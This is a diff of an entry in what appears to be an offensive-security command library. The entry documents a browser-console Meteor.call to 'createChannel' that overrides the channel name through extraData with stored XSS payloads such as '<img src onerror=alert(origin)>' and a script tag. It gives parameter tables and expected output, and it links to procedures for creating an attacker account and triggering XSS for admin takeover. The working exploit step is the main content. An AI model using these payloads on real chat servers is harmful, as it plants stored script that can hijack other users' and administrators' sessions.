@@ -1,23 +1,23 @@
 ---
-id: 123e4567-e89b-12d3-a456-426614174009
-name: meteor-call-create-channel-xss
-type: command
-executor: javascript
+id: cmd-meteor-call-xss
 data: >-
   Meteor.call('createChannel', 'valid-name', [], false, {}, { name: 'edit me
   <img src onerror=alert(origin)>' })
-output: null
-created_at: '2023-10-01T00:00:00Z'
-updated_at: '2025-12-14T03:16:02.410Z'
-platforms:
-  - Web
 tags:
   - xss
   - meteor
-  - exploit
+  - javascript
+type: command
+output: Channel created with payload in name property
+executor: javascript
+platforms:
+  - Web
+created_at: '2023-10-01T00:00:00Z'
+updated_at: '2025-12-14T17:31:18.925Z'
 verified: false
 validated: true
 submitted: true
+---
 ---
 
 # meteor-call-create-channel-xss
@@ -30,17 +30,18 @@ Meteor.call('createChannel', 'valid-name', [], false, {}, { name: 'edit me <img 
 
 ## Description
 
-Executes a Meteor method call in the browser console to create a channel, bypassing name validation by injecting the XSS payload into the extraData parameter, which gets merged into the room object and stored.
+Executes a Meteor method call from the browser console to create a public channel, overriding the name with an XSS payload via extraData for storage in the database.
 
 ## Parameters
 
 | Parameter | Description | Required |
 |-----------|-------------|----------|
-| 'valid-name' | Valid channel name for initial validation | Yes |
+| 'createChannel' | Method name | Yes |
+| 'valid-name' | Initial channel name | Yes |
 | [] | Empty members array | Yes |
-| false | Public channel flag | Yes |
-| {} | Empty options object | Yes |
-| { name: 'edit me <img src onerror=alert(origin)>' } | extraData with malicious name override | Yes |
+| false | Not private | Yes |
+| {} | Empty extraData object | Yes |
+| { name: 'edit me <img src onerror=alert(origin)>' } | Override with XSS in name | Yes |
 
 ## Examples
 
@@ -53,14 +54,14 @@ Meteor.call('createChannel', 'valid-name', [], false, {}, { name: 'edit me <img 
 ### Advanced Usage
 
 ```javascript
-Meteor.call('createChannel', 'test-channel', ['user1'], true, { custom: 'val' }, { name: 'payload <script>alert(1)</script>' })
+Meteor.call('createChannel', 'test', ['user1'], true, {type: 'p'}, { name: '<script>alert("xss")</script>' })
 ```
 
 ## Expected Output
 
-Channel created with ID returned, payload stored in database without triggering client validation.
+Returns channel object with ID; channel appears in UI, payload stored unescaped in DB.
 
 ## Related
 
-- [[procedures/Create-Attacker-Account-and-Inject-XSS]]
-- [[procedures/Trigger-XSS-for-Admin-Takeover]]
+- [[procedures/Create-Channel-with-Stored-XSS-Payload]]
+
